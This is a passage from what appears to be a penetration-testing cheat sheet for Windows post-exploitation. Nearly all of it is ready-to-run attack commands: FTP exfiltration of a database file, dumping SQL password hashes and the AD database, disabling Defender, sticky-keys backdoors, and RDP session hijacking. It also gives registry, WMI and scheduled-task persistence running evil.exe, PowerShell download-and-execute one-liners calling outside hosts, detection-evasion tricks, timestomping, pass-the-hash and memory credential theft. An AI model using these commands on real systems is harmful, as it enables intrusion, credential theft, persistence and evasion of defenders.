3 4 5 6 echo open 10.1.2.3> C:script.txt echo user myftpuser>> C:script.txt echo pass myftppass>> C:script.txt echo put E:backupsdatabase.dbf>> C:script.txt echo bye>> C:script.txt ftp -s:script.txt WMI call remote system 1 wmic / node : remote_computer process call create \"netstat.exe -ano &gt; C:output.txt\" View established connections of current machine: 1 netstat -a -n -p tcp | find \"ESTAB\" View open ports of current machine: 1 2 3 netstat -a -n -p tcp | find \"LISTEN\" netstat -a -n -p udp View network configuration: 1 2 3 netsh interface ip show addresses netsh interface ip show route netsh interface ip show neighbors View current network shares: 1 net share Mount a remote share with the rights of the current user: 1 net use K: \\10.1.2.3C$ Enable Remote Desktop: 1 reg add \"HKLMSystemCurrentControlSetControlTerminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f One-Liner Windows Enumeration Reference: https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7 1 whoami &amp; hostname &amp; ipconfig /all &amp; net user /domain 2&gt;&amp;1 &amp; net group /domain 2&gt;&amp;1 &amp; net group \"domain admins\" /domain 2&gt;&amp;1 &amp; net group \"Exchange Trusted Subsystem\" /domain 2&gt;&amp;1 &amp; net accounts /domain 2&gt;&amp;1 &amp; net user 2&gt;&amp;1 &amp; net localgroup administrators 2&gt;&amp;1 &amp; netstat -an 2&gt;&amp;1 &amp; tasklist 2&gt;&amp;1 &amp; sc query 2&gt;&amp;1 &amp; systeminfo 2&gt;&amp;1 &amp; reg query \"HKEY_CURRENT_USERSoftwareMicrosoftTerminal Server ClientDefault\" 2&gt;&amp;1 &amp; net view &amp; net view /domain &amp; net user %USERNAME% /domain &amp; nltest /dclist &amp; gpresult /z Check for unquoted service paths 1 wmic service get name,displayname,pathname,startmode | findstr /i /v \"c:windows\\\" | findstr /i /v \"\"\" or 1 gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith(\"`\"\")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(\".\") +4)) -match \".* .*\"} Change Windows Proxy Settings Command to enable proxy usage: 1 reg add \"HKCUSoftwareMicrosoftWindowsCurrentVersionInternet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f Command to disable proxy usage: 1 reg add \"HKCUSoftwareMicrosoftWindowsCurrentVersionInternet Settings\" /v ProxyEnable /t REG_DWORD /d 0 /f Command to change the proxy address: 1 reg add \"HKCUSoftwareMicrosoftWindowsCurrentVersionInternet Settings\" /v ProxyServer /t REG_SZ /d proxyserveraddress:proxyport /f Also, in this case, it is a per-user setting than a system-wide setting. Mount a .win image remotely on target machine 1 2 3 4 5 6 7 8 9 Dism /get-wiminfo /wimfile:z:win7Acme_Win7.wim Boot Dir Dism /Mount-Wim /WimFile:z:win7Acme_Win7.wim /index:1 /MountDir:C:windowstempoffline C: Drive Dism /Mount-Wim /WimFile:z:win7Acme_Win7.wim /index:2 /MountDir:C:windowstempoffline Dism /UnMount-Wim /MountDir:C:windowstempoffline /discard Check if file is locked 1 @echo off; 2&gt;nul ( &gt;&gt;file.txt echo off) &amp;&amp; (echo not locked) || (echo locked) Lock a file for testing 1 (>&2 pause) >> file.txt DSQUERY \u00b6 Get attributes for all Windows hosts in the Domain 1 dsquery * -filter \"(&amp;(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows*))\" -limit 0 |dsget computer -dn -samid -desc -loc &gt;c:windowstempcomputers.log Get attributes for computers in a specific OU 1 dsquery computer -limit 0 |dsget computer -dn -samid -desc -l &gt;c:windowstempout.log Get attributes for users in the specified OU 1 dsquery user -limit 0 |dsget user -dn -samid -display -desc -office -tel -email -title -hmdir -profile -loscr -mustchpwd -canchpwd -pwdneverexpires -disabled Get DC 1 dsquery server -forest or 1 dsquery server -o rdn -forest Get Domain Functional Level 1 dsquery * \"DC=corp,DC=test,DC=com\" -scope base -attr msDS-Behavior-Version ntMixedDomain Get Forest Functional Level 1 dsquery * \"CN=Partitions,CN=Configuration,DC=corp,DC=test,DC=com\" -scope base -attr msDS-Behavior-Version ntMixedDomain SQLCMD \u00b6 List Databases 1 sqlcmd -E -S localhost -Q \"EXEC sp_databases;\" List Tables in Database 1 sqlcmd -E -S localhost -Q \"SELECT * FROM DatabaseName.information_schema.tables;\" -W -w 999 -s\",\" -o \"c:windowstempRecruiterProd_MSCRM_tables.csv\" Retrieve table contents 1 sqlcmd -E -S localhost -d DatabaseName -Q \"SELECT * FROM SystemUserBase;\" -W -w 999 -s\",\" -o \"c:windowstempRecruiterProd_MSCRM_userbase.csv\" Dump MSSQL Password Hashes 1 sqlcmd -E -S localhost -Q \"SELECT name, password_hash FROM master.sys.sql_logins;\" NTDSUTIL \u00b6 Built-in utility to create backup copy of the AD database 1 ntdsutil \"ac i ntds\" \"ifm\" \"create full c:temp\" q q Applocker \u00b6 List Applocker's effective policy on the system 1 Get-ApplockerPolicy -Effective Windows Defender \u00b6 Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender) 1 c : program fileswindows defendermpcmdrun . exe \" - RemoveDefinitions - All Set - MpPreference - DisableIOAVProtection $true APPCMD \u00b6 Get virtual directories in IIS 1 c : windowssystem32inetsrvappcmd . exe list vdir / text : physicalpath Windows Lateral Movement \u00b6 RDP Hijacking If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command. Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command. RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # View RDP sessions on system your RDP'd to with administrative permissions # Locally quser # Remote quser /server: # Create a service that will swap your SESSIONNAME with the desired disconnected session sc create sesshijack binpath= \"cmd.exe /k tscon 1 /dest:rdp-tcp#XX\" error= \"ignore\" # Start service net start sesshijack or sc start sesshijack Linux to Windows Remoting 1 2 3 4 5 winrm set winrm/config/Service/Auth @{Basic=\"true\"} winrm set winrm/config/Service @{AllowUnencrypted=\"true\"} $cred = Get-Credential Enter-PSSession -ComputerName 'winserver1' -Credential $cred -Authentication Basic PowerShell Remoting over SSH 1 Enter-PSSession -Hostname -Username james -SSHTransport Windows Persistence Methods \u00b6 Registry Keys \u00b6 Modify registry keys \u00b6 1 2 3 4 5 #Add a key/value reg add \\ /v \"\"\" /t /d #Delete a key/value reg delete \\ /v \"\" Userinit Key \u00b6 This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:windowssystem32userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma. 1 2 HKEY_LOCAL_MACHINESoftwareMicrosoftWindows NTCurrentVersionWinlogonUserinit HKLMSoftwareMicrosoftWindows NTCurrentVersionWinlogonUserinit = (REG_SZ) C:windowssystem32userinit.exe,c:windowsbadprogram.exe Run Key \u00b6 1 2 3 4 5 6 7 #System Wide HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRunOnce #Current Logged-On User Only HKEY_CURRENT_USERSOFTWAREMicrosoftWindowsCurrentVersionRun HKEY_CURRENT_USERSOFTWAREMicrosoftWindowsCurrentVersionRunOnce List Image File Execution Options (Debugger file executed when the target file is run) \u00b6 1 HKLMSoftwareMSWindowsNTCurrentVersionImage File Execution Optionsnotepad.exedebugger(REG_SZ = cmd.exe) AppInit_DLLs \u00b6 Load custom DLLs each time a program runs (If it loads USER32.dll). This is checked by most AV! This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system. 1 HKLMSOFTWAREMicrosoftWindowsCurrentVersionWindowsAppInit_DLLs No-reboot sethc/utilman option using a \"debugger\" key \u00b6 Navigate to HKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Options Make key called \"sethc.exe\" Make a REG_SQ value called \"Debugger\" Assign it \"c:windowssystem32cmd.exe\" as the value Hit SHIFT 5 times and get a shell as nt authoritysystem 1 2 reg add \"\\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe\" /v Debugger /t REG_SZ /d \"c:windowssystem32cmd.exe\" reg add \"\\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionsutilman.exe\" /v Debugger /t REG_SZ /d \"c:windowssystem32cmd.exe\" Remove the debugger key 1 2 reg delete \"\\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe\" /f reg delete \"\\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionsutilman.exe\" /f File Storage Locations \u00b6 Startup Folders \u00b6 1 2 3 4 5 6 7 8 9 10 11 #All Users - Windows XP C:Documents and SettingsAll UsersStart MenuProgramsStartup #All Users - Windows Vista+ C:ProgramDataMicrosoftWindowsStart MenuProgramsStartup #User Profile - Windows XP C:Documents and Settings\\Start MenuProgramsStartup #User Profile - Windows Vista+ C:Users\\AppDataRoamingMicrosoftWindowsStart MenuProgramsStartup SETHC/UTILMAN Replacement \u00b6 Replace these binaries, may require a reboot to take effect 1 2 %WINDIR%System32sethc.exe %WINDIR%System32utilman.exe Hit shift 5 times = sethc.exe run by SYSTEM Windows key + U = utilman.exe run by SYSTEM Volume Shadow Copy (Restore Points) \u00b6 Windows service that's constantly running \u2013 takes snapshots of system directories Drop Malware -> Create VSC (ReadOnly) -> Delete Malware -> Use WMIC to run VSC of malware Registry Key to Disable Volume Shadow Copy 1 HKLMSystemCurrentControlSetControlBackupRestoreFilesNotToSnapshot VSSADMIN \u2013 native windows utility \u00b6 vssadmin create command only applies to Server OS (Win2k3,2008) 1 2 3 4 5 vssadmin list shadows vssadmin create shadow /for=C: wmic /node:DC1 /user:DOMAINdomainadminsvc /password:domainadminsvc123 process call create \"cmd /c vssadmin create shadow /for=C mklink /D C:VscAccess \\?GLOBALROOTDeviceHardDiskVolumeShadowCopy1 copy \\?GLOBALROOTDeviceHardDiskVolumeShadowCopy4pathtosomefile e:files Use WMIC process call to run an .exe from a Volume Shadow Copy \u00b6 1 wmic process call create \\.GLOBALROOTDeviceHarddiskVolumeShadowCopy1windowssystem32evil.exe This process will not show the imagename (executable filename) or commandline parameters in the task list. The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it. 1 2 root@kali:~# wmis -U DOMAINdomainadminsvc%domainadminsvc123 //ServerName \\?GLOBALROOTDeviceHarddiskVolumeShadowCopy1Windowssystem32evil.exe NTSTATUS: NT_STATUS_OK - Success In Kali Linux you could use the WMIS package to do the same thing: 1 2 wmis -U DOMAINdomainadminsvc%domainadminsvc123 //ServerName \\?GLOBALROOTDeviceHarddiskVolumeShadowCopy1Windowssystem32evil.exe NTSTATUS: NT_STATUS_OK - Success Task Scheduling \u00b6 AT \u00b6 Executes as system and must be an Admin to run it. Check groups with whoami /groups 1 2 3 4 5 at 13:20 /interactive cmd net user arget /user:Domainuser pass net time arget at arget 13:20 c:tempevil.bat SCHTASKS \u00b6 Any user can create a task Schedule a binary to run with arguments on system events 1 2 3 4 5 6 7 8 9 10 11 #On System Startup schtasks /create /TN OfficeUpdaterA /tr \"\"c:evil32.exe\" -k password -n services\" /SC onstart /RU system /RL HIGHEST schtasks /create /TN OfficeUpdaterD /tr \"\"c:Program Filesevil32.exe\" -k password -n services\" /SC onstart /RU system /RL HIGHEST #On User Login schtasks /create /TN OfficeUpdaterB /tr \"\"c:evil32.exe\" -k password -n services\" /SC onlogon schtasks /create /TN OfficeUpdaterE /tr \"\"c:Program Filesevil32.exe\" -k password -n services\" /SC onlogon #On Idle schtasks /create /TN OfficeUpdaterC /tr \"\"c:evil32.exe\" -k password -n services\" /SC onidle /i 30'''' schtasks /create /TN OfficeUpdaterF /tr \"\"c:Program Filesevil32.exe\" -k password -n services\" /SC onidle /i 60 Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exploitwindowsmiscpsh_web_delivery' 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #(X86) - On User Login schtasks /create /tn OfficeUpdaterA /tr \"c:windowssystem32WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'\" /sc onlogon /ru System #(X86) - On System Start schtasks /create /tn OfficeUpdaterB /tr \"c:windowssystem32WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'\" /sc onstart /ru System #(X86) - On User Idle (30mins) schtasks /create /tn OfficeUpdaterC /tr \"c:windowssystem32WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'\" /sc onidle /i 30 #(X64) - On User Login schtasks /create /tn OfficeUpdaterA /tr \"c:windowssyswow64WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'\" /sc onlogon /ru System #(X64) - On System Start schtasks /create /tn OfficeUpdaterB /tr \"c:windowssyswow64WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'\" /sc onstart /ru System #(X64) - On User Idle (30mins) schtasks /create /tn OfficeUpdaterC /tr \"c:windowssyswow64WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30 Additional Notes \u00b6 Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash () AND quotation marks (\"): Delete scheduled task without prompting 1 schtasks /delete /f /TN taskname Detailed scheduled tasks listing 1 schtasks /query /V /FO list View scheduled tasks log (for troubleshooting) 1 2 3 notepad c:windowsschedlgu.txt (Windows XP) notepad c:windowstasksschedlgu.txt (Vista+) Windows Service \u00b6 1 2 3 sc query sc create <\\Target(optional)> binPath= type= share start= auto DisplayName= sc delete DLL-Hijacking \u00b6 Order of DLL Loading 1 2 3 4 5 6 1. The directory from which the application is loaded 2. The current directory 3. The system directory, usually C:\\Windows\\System32\\ (The GetSystemDirectory function is called to obtain this directory.) 4. The 16-bit system directory - There is no dedicated function to retrieve the path of this directory, but it is searched as well. 5. The Windows directory. The GetWindowsDirector function is called to obtain this directory. 6. The directories that are listed in the PATH environment variable. Many systems use bginfo (seen it a lot in operational sys). Drop Riched32.dll in the dir with bginfo.exe. Codex. Older list of dlls as well (2010). https://www.exploit-db.com/dll-hijacking-vulnerable-applications/ On Windows 7 there are three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 C : windowsehomeMcx2Prov . exe C : WindowsehomeCRYPTBASE . dll C : windowsSystem32sysprepsysprep . exe C : WindowsSystem32sysprepCRYPTSP . dll C : windowsSystem32sysprepCRYPTBASE . dll C : WindowsSystem32sysprepRpcRtRemote . dll C : WindowsSystem32sysprepUxTheme . dll C : windowsSystem32cliconfg . exe C : WindowsSystem32NTWDBLIB . DLL On Windows 8 there are also three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 C : windowsSystem32sysprepsysprep . exe C : windowsSystem32sysprepCRYPTBASE . dll C : WindowsSystem32Sysprepdwmapi . dll C : WindowsSystem32SysprepSHCORE . dll C : windowsSystem32cliconfg . exe C : WindowsSystem32NTWDBLIB . DLL C : windowsSystem32pwcreator . exe C : WindowsSystem32vds . exe C : WindowsSystem32UReFS . DLL Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 12 13 14 C : windowsSystem32sysprepsysprep . exe C : WindowsSystem32SysprepSHCORE . dll C : WindowsSystem32SysprepOLEACC . DLL C : windowsSystem32cliconfg . exe C : WindowsSystem32NTWDBLIB . DLL C : windowsSystem32pwcreator . exe C : WindowsSystem32vds . exe C : Program FilesCommon Filesmicrosoft sharedinkCRYPTBASE . dll C : Program FilesCommon Filesmicrosoft sharedinkCRYPTSP . dll C : Program FilesCommon Filesmicrosoft sharedinkdwmapi . dll C : Program FilesCommon Filesmicrosoft sharedinkUSERENV . dll C : Program FilesCommon Filesmicrosoft sharedinkOLEACC . dll linkinfo.dll Replacement \u00b6 Windows explorer in older systems loads linkinfo.dll from c:windows over c:windowssystem32 if it exists 1 copy evil.dll c:windowslinkinfo.dll WMI Event Persistence via Powershell \u00b6 WMI Event persistence explained, you can find a bloated version in powersploit. Three parts to this: * WMI Event Filter * Event Consumer * Filter/Consumer Binding This technique gets you SYSTEM level persistence, requires admin rights to execute. Autoruns doesn't even check for this yet. (doubt any AVs are either) Difficult to detect, Difficult to remove if you dont know what youre doing. WMI Event Filter \u00b6 Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing) 1 2 3 4 5 6 7 $EventFilter = ([WMICLASS]\"\\.rootsubscription:__EventFilter\").CreateInstance() $EventFilter.QueryLanguage = \"WQL\" $EventFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325\" $EVentFilter.EventNamespace = \"rootcimv2\" $EventFilter.Name = \"OBVIOUSHACKER\" $Result = $EventFilter.Put() $Filter = $Result.Path http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx Event Consumer \u00b6 Configure what to execute once the event occurs. Current example is just a ping. 1 2 3 4 5 6 $InstanceConsumer = ([wmiclass]\"\\.rootsubscription:CommandLineEventConsumer\").CreateInstance() $InstanceConsumer.Name = \"OBVIOUSHACKER\" $InstanceConsumer.CommandLineTemplate = \"ping 127.0.0.1 -n 100\" #CMD TO EXECUTE HERE $InstanceConsumer.WorkingDirectory = \"C:\\windows\\system32\" $Result = $InstanceConsumer.Put() $Consumer = $Result.Path http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx Filter/Consumer Binding \u00b6 This is the object that correlates the Filter with the Consumer. Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service. 1 2 3 4 $InstanceBinding = ([wmiclass]\"\\.rootsubscription:__FilterToConsumerBinding\").CreateInstance() $InstanceBinding.Filter = $Filter $InstanceBinding.Consumer = $Consumer $Result = $InstanceBinding.Put() http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx REMOVAL \u00b6 The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example) 1 2 3 Get-WmiObject __eventFilter -namespace rootsubscription -filter \"name='OBVIOUSHACKER'\"| Remove-WmiObject Get-WmiObject CommandLineEventConsumer -Namespace rootsubscription -filter \"name='OBVIOUSHACKER'\" | Remove-WmiObject Get-WmiObject __FilterToConsumerBinding -Namespace rootsubscription | Where-Object { $_.filter -match 'OBVIOUSHACKER'} | Remove-WmiObject Some more detailed information on the subject http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/ Malicious Outlook Rules \u00b6 https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/ Ruler https://github.com/sensepost/ruler Windows Remote Management (WinRM) / PSRemoting \u00b6 Listens on 5985/5986 by default and allows interactive shell access over HTTP/S Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module) Metasploit has multiple modules for locating the service and gaining shells over WinRM Connect to a remote host with WinRM from local Windows host 1 2 3 4 5 6 Enable-PSRemoting Set-Item -Path WSMan:localhostClientTrustedHosts * -force or Set-Item -Path WSMan:localhostClientTrustedHosts -value \"\" -Force $cred = Get-Credential Invoke-Command -ComputerName -ScriptBlock { gci c: } -credential $cred Uninstall a patch to leave the system vulnerable \u00b6 1 wusa.exe /uninstall /kb:976932 Create custom DLL for password filters and install on DC to capture changed passwords \u00b6 http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html Application Whitelisting Bypass Techniques \u00b6 SubTee Collection of Whitelist Bypass Techniques https://bitbucket.org/jsthyer/wevade.git Version .0.0.3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 1. IEExec -This technique may work in certain environments. Its relies on the fact that many organizations trust executables signed by Microsoft. We can misuse this trust by launching a specially crafted .NET application. Example Here: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/ 2. Rundll32.exe 3. ClickOnce Applications dfsvc.exe dfshim.dll 4. XBAP - XML Browser Applications WPF PresentationHost.exe 5. MD5 Hash Collision http://www.mathstat.dal.ca/~selinger/md5collision/ 6. PowerShell - Specifically Reflective Execution [Reflective DLL Injection with PowerShell][10] https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf 7. .HTA Application Invoke PowerShell Scripts Launched by mshta.exe, bypasses IE security settings as well. 8. bat, vbs, ps1 1. cmd.exe /k < script.txt 2. cscript.exe //E:vbscript script.txt 3. Get-Content script.txt | iex 9. Malicious Troubleshooting packs - MSDT.exe Reference: http://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/ Thanks to @nberthaume, @Killswitch_GUI 10. InstallUtil.exe A signed MS binary that loads assemblies and executes - One of the best. Examples here: https://gist.github.com/subTee 11. Regsvcs/Regasm See: https://gist.github.com/subTee/fb09ef511e592e6f7993 These 2 are Excellent. 12. regsvr32.exe https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302 This one is just simply amazing... regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll 13. Msbuild.exe http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html ``` ## Certutil https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46 File download ``` certutil -urlcache -split -f http://example.com/file ``` ## Active Directory Enumeration ### Adfind www.joeware.net/freetools/tools/adfind/ ``` AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f \"objectcategory=computer\" > domain_computers.txt AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f \"objectcategory=computer\" distinguishedName dNSHostName description whenchanged operatingSystem operatingSystemVersion > domain_computers_light.txt AdFind.exe -u account@domain.com -up pass -h 10.4.128.40:389 -b dc=domain,dc=com -f \"objectcategory=user\" samaccountname description pwdlastset orclcommonattribute > domain_users_light.txt Powershell \u00b6 List help for cmdlet: Get-Help [cmdlet] -full List available properties and methods: Get-Member For-each loop: ForEach-Object { $_ } Search for string (like grep): Select-String -path [file] -pattern [string] Timestomp 1 2 3 4 5 $ file =( gi c : file . exe ); $ date = '01/03/2009 12:12 pm' ; $ file . LastWriteTime =$ date ; $ file . LastAccessTime =$ date ; $ file . CreationTime =$ date Show last system boot time 1 Get-WmiObject win32_operatingsystem | select csname, @ { LABEL = 'LastBootUpTime' ; EXPRESSION = { $_.ConverttoDateTime ( $_.lastbootuptime ) }} Wrap binary execution in a powershell loop 1 powershell foreach ($ target in ( get-content c : usersusernameappdatalocaltemphosts_da_loggedin_unique . txt )) { \" [ * ] $ Target : \" ; ( c : programdatasd . exe ./ administrator @ $ target - hashes aad3b435b51404eeaad3b435b51404ee : a4bab1c7d4bef62d4c22043ddbf1312c ) } ` Download a file 1 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } ;(new-object system.net.webclient).downloadfile(\"https://www.mydomain.com/file\",\"C:UsersusernameAppDataLocalTempfile.txt\") Encode string 1 echo \"iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')\" | iconv --to-code UTF-16LE | base64 -w 0 List recently modified files in path (U:) 1 Get-Childitem u: -Recurse | where-object {!($_.psiscontainer)} | where { $_.LastWriteTime -gt $(Get-Date).AddDays(-1) } | foreach {\"$($_.LastWriteTime) :: $($_.Fullname) \" } List Files 1 Select-String -Path c:fso*.txt, c:fso*.log -pattern ed List First 100 Files 1 Get-ChildItem -Path XXX |Select -First 100 Fullname List a Process's Loaded Modules (DLL) 1 get-process -id 1234|select -expand modules Remote Command Execution using MMC 1 https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C ,ADMIN ,ADMIN ) 1 Get-ItemProperty HKLM:SOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem |Select LocalAccountTokenFilterPolicy |fl Test User Credentials 1 powerpick $password = ConvertTo-SecureString \"PlainTextPassword\" -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential (\"domainname\", $password); Search for SSN https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx 1 $SSN_Regex = \" [0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}\" ; Get-ChildItem . -Recurse -exclude *.exe,*.dll| Select-String -Pattern $SSN_Regex | Select-String -Pattern $SSN_Regex| Select-Object Path,Filename,Matches |ft -auto|out-string -width 200; \"[*] SSN Search Complete!\" Enumerate the use of the Windows Server Update Services (WSUS) 1 2 3 4 5 6 7 Get-ItemProperty -Path Registry::\"HKLMSOFTWAREPoliciesMicrosoftWindowsWindowsUpdate\" |Select-Object -ExpandProperty WUServer Get-ItemProperty -Path Registry::\"HKLMSOFTWAREPoliciesMicrosoftWindowsWindowsUpdate\" |Select-Object -ExpandProperty WUStatusServer Get-ItemProperty -Path Registry::\"HKLMSOFTWAREPoliciesMicrosoftWindowsWindowsUpdateAU\" |Select-Object -ExpandProperty UseWUServer reg query HKEY_LOCAL_MACHINESOFTWAREPoliciesMicrosoftWindowsWindowsUpdate Get unquoted service paths 1 gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith(\"`\"\")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(\".\") +4)) -match \".* .*\"} Find-Files (custom) \u00b6 1 Find-Files -searchBase \"i:\" -searchTerms \"*web.xml*,*web.config*,*password*,*tomcat-users.xml*\" -LogPath \"C:UsersusernameAppDataLocalTemp\" Get-Enumeration (custom) \u00b6 Run Local and Domain enumeration functions on the local host. 1 Get-Enumeration -Path . -Local -Domain Download and execute IEX \u00b6 1 powershell -nop -w hidden -c \"iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')\" EncodedCommand and IEX detection bypass \u00b6 Author: Dave Kennedy Source: https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/ Avoid detection of -enc 1 powershell -window hidden -C \"set-variable -name \"C\" -value \"-\"; set-variable -name \"s\" -value \"e\"; set-variable -name \"q\" -value \"c\"; set-variable -name \"P\" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() \" Avoid detection of IEX 1 powershell -window hidden -C \"set-variable -name \"LB\" -value \"I\"; set-variable -name \"I\" -value \"E\"; set-variable -name \"V\" -value \"X\"; set-variable -name \"wP\" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() ('')\" Bloodhound \u00b6 1 2 3 iex (( new-object system . net . webclient ) . downloadstring ( 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1' )); Invoke-Bloodhound -CSVFolder c : temp -CSVPrefix Invoke-BloodHound -DomainController -Domain -CSVFolder C : userspubliclibraries -CSVPrefix -CollectionMethod Stealth Mimikittenz \u00b6 https://github.com/putterpanda/mimikittenz mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes. mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to: TRACK2 (CreditCard) data from merchant/POS processes PII data Encryption Keys & All the other goodstuff Execution 1 Invoke-Mimikittenz Customizations 1 2 3 4 5 Custom regex - The syntax for adding custom regex is as follows: [mimikittenz.MemProcInspector]::AddRegex(\"\",\"\") Custom target process - Just append your target proccess name into the array: [mimikittenz.MemProcInspector]::InspectManyProcs(\"iexplore\",\"chrome\",\"firefox\") PowerUp \u00b6 Performs multiple local host privilege escalation checks for common Windows misconfigurations. 1 Invoke-AllChecks See cheat sheet for more commands PowerView \u00b6 Requires domain user privileges Find Administrative users logged in across the domain \u2013 default group = Domain Admins) 1 2 Invoke-UserHunter -Threads 15 -NoPing [-GroupName \"Enterprise Admins\"] Invoke-UserHunter -Threads 20 -GroupName \"Domain Admins\" -SearchForest -CheckAccess Find User (Stealthy via Fileshares) 1 Invoke-UserHunter -Stealth -Threads 5 -NoPing [-GroupName \"Enterprise Admins\"] [-UserName \"svcAccount\"] Get domain user info 1 2 3 Get-NetUser [-UserName john] Get-NetUser -Domain | Select-Object objectsid,lockouttime,samaccounttype,accountexpires,objectclass,useraccountcontrol,@{Name='memberof';Expression={[string]::join(\";\",($_.memberof))}},info,distinguishedname,adspath,cn,pwdlastset,objectguid,whencreated,description,samaccountname,usnchanged,name| export-csv 